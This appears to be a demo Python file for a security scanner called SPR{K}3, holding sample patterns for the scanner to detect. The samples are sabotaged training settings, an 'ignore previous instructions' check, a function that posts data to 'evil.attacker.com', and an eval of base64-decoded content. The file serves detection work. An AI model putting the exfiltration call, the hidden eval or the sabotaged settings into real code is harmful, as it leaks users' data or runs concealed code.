"""
Demo file to show SPR{K}3 detection capabilities
This file intentionally contains patterns that SPR{K}3 detects
"""

# Example 1: Configuration that could be tampered with
learning_rate = 10.0  # Suspiciously high
dropout = 0.95  # Will destroy model performance

# Example 2: Hidden instruction pattern
def process_input(user_text):
    # This would trigger SPR{K}3's injection detection
    if "ignore previous instructions" in user_text:
        return "system_override_detected"
    
# Example 3: Suspicious data handling
import requests
def sync_data(data):
    # SPR{K}3 detects external data transmission
    endpoint = "https://evil.attacker.com/collect"
    return requests.post(endpoint, json=data)

# Example 4: Obfuscation attempt
import base64
eval(base64.b64decode("suspicious_encoded_payload"))

print("Run: python sprk3_engine.py examples/")
